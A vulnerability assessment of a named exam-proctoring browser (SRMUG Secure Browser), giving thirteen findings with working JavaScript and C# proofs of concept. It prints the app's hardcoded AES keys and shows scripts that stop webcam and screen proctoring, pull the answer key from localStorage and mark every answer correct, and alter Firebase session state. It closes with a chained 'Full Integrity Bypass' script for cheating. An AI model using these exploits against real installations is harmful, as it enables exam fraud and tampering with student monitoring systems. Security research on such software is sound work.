# SRM Secure Browser — Security Assessment & Technical Vulnerability Analysis

**App:** SRMUG-Secure-Browser v1.0.22 by Eduswitch Solutions Pvt Ltd  
**Analyzed:** app.asar extracted (1,474 files, 336 directories, 25 Win32 EXEs)  
**Runtime Stack:** Electron 10.4.6, Chromium 85.0.4183.121, Node.js 12.16.3, V8 ~8.6  

---

## Technical Overview

The application is an Electron wrapper around a Chromium shell used to enforce an online examination lockdown. The exam environment runs inside a `<webview>` tag. Around that webview sits a security architecture consisting of:
- A preload script (`preload.js`) bridging IPC communications between the exam webview and the Electron main process.
- Multiple obfuscated and plaintext JavaScript renderers managing webcam/desktop capture, WebRTC video streaming, TensorFlow.js face/object detection (BlazeFace + COCO-SSD), and Firebase Realtime Database sync.
- A suite of Win32 native binaries spawned as child processes for keyboard hooking, process enumeration, user switching monitoring, and virtual machine detection.

---

## Vulnerability Analysis with Proofs of Concept

### 1. Hardcoded AES-ECB Encryption Keys in Renderer Source

The application encrypts Firebase database configuration and WebRTC ICE server credentials in transit. However, the decryption logic in `chrome-tabs/renderer.js` relies on hardcoded symmetric keys stored directly in the obfuscated string table:

- `keysefghijkldesk` — Decrypts Firebase API keys and database configuration.
- `icesefghijklmnop` — Decrypts STUN/TURN ICE server credentials.

Both keys use **AES-128 in ECB mode**. ECB mode operates without an Initialization Vector (IV), rendering the cipher deterministic and leaking structural plaintext patterns.

#### Vulnerable Code
```javascript
// Recovered decryption routine from renderer.js
let key = CryptoJS.enc.Utf8.parse('keysefghijkldesk');
let decrypted = CryptoJS.AES.decrypt(responseText, key, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7
});
var config = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8)).FirebaseKeys;
```

#### Proof of Concept
```javascript
// Node.js utility to decrypt intercepted configuration payloads
const crypto = require('crypto');
const FIREBASE_KEY = Buffer.from('keysefghijkldesk', 'utf8');

function decryptConfig(ciphertextBase64) {
    const decipher = crypto.createDecipheriv('aes-128-ecb', FIREBASE_KEY, null);
    decipher.setAutoPadding(true);
    let plain = decipher.update(ciphertextBase64, 'base64', 'utf8');
    plain += decipher.final('utf8');
    return JSON.parse(plain);
}
```

---

### 2. Unvalidated postMessage Handler in Preload Script

In `preload.js` (lines 101–122), the application listens for cross-document window messages to handle lifecycle actions like starting or stopping proctoring streams. The event handler performs no verification on `event.origin`.

#### Vulnerable Code
```javascript
window.addEventListener('message', function (event) {
    if (event.data.msg == "opentab" || event.data.Action == "opentab") {
        ipcRenderer.sendToHost('return-translation', { source: event.data.url });
    }
    else if (event.data.msg == "start" || event.data.Action == "start") {
        ipcRenderer.sendToHost('start-proctoring', event.data);
    }
    else if (event.data.msg == "stop" || event.data.Action == "stop") {
        ipcRenderer.sendToHost('stop-proctoring');
    }
    else if (event.data.msg == "actualstart" || event.data.Action == "actualstart") {
        ipcRenderer.sendToHost('actually-start');
    }
}, false);
```

#### Proof of Concept
```javascript
// From browser DevTools console or any injected iframe script:
window.postMessage({ msg: "stop" }, "*");
// Result: Webcam and desktop streams terminate silently without UI alerts.
```

---

### 3. Public Privileged Lifecycle Globals Attached to Window

`preload.js` (lines 6–15) exposes privileged IPC triggers directly to the exam page's global `window` context before page scripts load.

#### Vulnerable Code
```javascript
window.StartTest = function (StudentInfoJSON) {
    ipcRenderer.sendToHost('start-proctoring', StudentInfoJSON);
}
window.EndTest = function () {
    ipcRenderer.sendToHost('stop-proctoring');
}
```

#### Proof of Concept
```javascript
// Kill proctoring via global call
window.EndTest();

// Restart session with forged student metadata
window.StartTest({
    studentName: "Attacker",
    studentId: "000000",
    examId: "FORGED-EXAM"
});
```

---

### 4. Client-Side Answer Grading and Local Answer Key Exposure

The application loads the complete question set from the server at exam initialization and stores it in browser storage under `localStorage.getItem("ExamQuestionsObj")`. Crucially, each question object includes the `CorrectAns` field. Evaluation occurs entirely client-side in `chrome-tabs/Renderer/renderer-Exam.js` (lines 300–313).

#### Vulnerable Code
```javascript
var QuestionObj = QuestionsGlobal[currentQuestionNo];
if (selectedOpt) {
    let isAnswerCorrect;
    if (QuestionObj.CorrectAns == selectedOpt) {
        isAnswerCorrect = true;
    } else {
        isAnswerCorrect = false;
    }
    QuestionObj.selectedOpt = selectedOpt;
    QuestionObj.isAnswerCorrect = isAnswerCorrect;
}
```

#### Proof of Concept
```javascript
// Extract answer key and mutate all submissions to correct state
const exam = JSON.parse(localStorage.getItem("ExamQuestionsObj"));
exam.QuestionsJSON.forEach((q, i) => {
    console.log(`Q${i+1}: ${q.question} => ${q.CorrectAns}`);
    q.selectedOpt = q.CorrectAns;
    q.isAnswerCorrect = true;
});
localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));
// Submitting the exam now transmits all-correct scoring flags to the backend.
```

---

### 5. Production Debug Flags and Privileged Process Leaks

In `chrome-tabs/Renderer/renderer-Login.js` (line 149), window blur detection is gated by an exposed developer toggle:

```javascript
window.onblur = function () {
    if (DisableForegroundingFromMainForDebugging === false) {
        ipcRenderer.send('blur:application', true);
    }
}
```

#### Proof of Concept
```javascript
// Disable window blur/alt-tab reporting entirely
window.DisableForegroundingFromMainForDebugging = true;
```

---

### 6. Outdated Electron Runtime Carrying Unpatched Chromium CVEs

The application relies on `electron.remote`, which was deprecated in Electron 14 and removed in Electron 21. The runtime is pinned to **Electron 10.4.6** (Chromium 85.0.4183.121, Node.js 12.16.3).

```javascript
// preload.js line 2
const remote = require('electron').remote;
var ProcessesRunning = remote.getGlobal('ProcessesRunning');
```

---

### 7. Direct Client-Writable Firebase Session State

The renderer writes operational telemetry directly to Firebase database paths without server-side validation rules. For example, in `renderer-Exam.js` (line 339):

```javascript
var questionCurrentIndexRef = firebase.database().ref('webrtc/students/' + studentFirebaseIdKeyGlobal + '/questionCurrentIndex');
questionCurrentIndexRef.set(currentQuestionNo);
```

#### Proof of Concept
```javascript
// Overwrite session status in Firebase Realtime Database
if (typeof firebase !== "undefined" && typeof studentFirebaseIdKeyGlobal !== "undefined") {
    firebase.database().ref('webrtc/students/' + studentFirebaseIdKeyGlobal).update({
        isOnline: false,          // Disappear from proctoring dashboard
        AllowScreenRecord: false, // Suppress recording flags
        isExamEnded: false        // Block remote session termination
    });
}
```

---

### 8. Easily Bypassable Native Virtual Machine Detection

`VMDetect.exe` (~15KB) is spawned as a child process to detect virtualized execution environments. It checks hypervisor CPUID bits, SMBIOS vendor strings, and driver files (`vboxguest.sys`, `vmhgfs.sys`).

#### Proof of Concept
Since `VMDetect.exe` resides in a user-writable path (`AppData\Local\Programs\SRM\resources\app.asar.unpacked\`), replace the binary with a compiled C# stub:

```csharp
using System;
class Stub {
    static void Main(string[] args) {
        Console.WriteLine("{\"result\": \"ok\", \"status\": 0}");
    }
}
```

---

### 9. Ineffective PrintScreen Hotkey Handling

`renderer-Login.js` (lines 116–119) listens for keyboard events matching `keyCode == 44` (PrintScreen) and overwrites the system clipboard with an empty string. Standard capture tools like Snipping Tool (`Win+Shift+S`) bypass this check entirely.

---

### 10. Deprecated Network Client and Unpinned API Endpoints

The application relies on the deprecated `request` module (`^2.87.0`) in `Main/main-GetAllExamKeys.js` to fetch configuration tokens without certificate pinning or TLS enforcement.

---

### 11. Silent Geolocation Data Collection

Inside `renderer-WebRtc.js`, during WebRTC initialization, the client invokes `navigator.geolocation.getCurrentPosition()` and POSTs coordinates to `AssessmentConfig.SetStudentLocation` without explicit UI disclosure.

---

### 12. Leaked Auto-Updater Repository Configuration

The packaged bundle contains `app-update.yml`, exposing auto-updater metadata (`nevillekatila/es-stage`).

---

### 13. Hardcoded Media Storage Upload Endpoints

Webcam and screen video recordings are captured in 30-second chunks using `MediaStreamRecorder` and posted to hardcoded Azure Blob Storage endpoints (`UploadStudentWebCamVideo`, `UploadStudentDesktopVideo`).

---

## Chained Exploitation Vector (Full Integrity Bypass)

```javascript
// 1. Disable tab-blur reporting
window.DisableForegroundingFromMainForDebugging = true;

// 2. Extract answer key and mutate score to 100%
const exam = JSON.parse(localStorage.getItem("ExamQuestionsObj"));
exam.QuestionsJSON.forEach(q => {
    q.selectedOpt = q.CorrectAns;
    q.isAnswerCorrect = true;
});
localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));

// 3. Kill proctoring recording feeds silently
window.postMessage({ msg: "stop" }, "*");

// 4. Submit exam
```

---

## Vulnerability Summary Table

| # | Vulnerability Description | Severity | Target File / Component |
|---|---|---|---|
| 1 | Hardcoded AES-ECB keys in renderer | **Critical** | `chrome-tabs/renderer.js` |
| 2 | Unvalidated postMessage origin handler | **Critical** | `preload.js` |
| 3 | Public privileged lifecycle globals on window | **High** | `preload.js` |
| 4 | Client-side answer grading & key exposure | **Critical** | `renderer-Exam.js` |
| 5 | Production debug flags & process list leaks | **High** | `renderer-Login.js` / `preload.js` |
| 6 | Outdated Electron runtime (v10.4.6) with `remote` | **High** | `package.json` / `preload.js` |
| 7 | Direct client-writable Firebase session state | **High** | `renderer-Exam.js` / Firebase DB |
| 8 | Easily bypassable native VM detection | **Medium** | `VMDetect.exe` |
| 9 | Ineffective PrintScreen hotkey handling | **Low** | `renderer-Login.js` |
| 10 | Deprecated `request` module & unpinned APIs | **Medium** | `main-GetAllExamKeys.js` |
| 11 | Silent geolocation data collection | **Medium** | `renderer-WebRtc.js` |
| 12 | Leaked auto-updater repository metadata | **Low** | `app-update.yml` |
| 13 | Hardcoded media storage upload endpoints | **Medium** | `renderer.js` / Azure Blob |
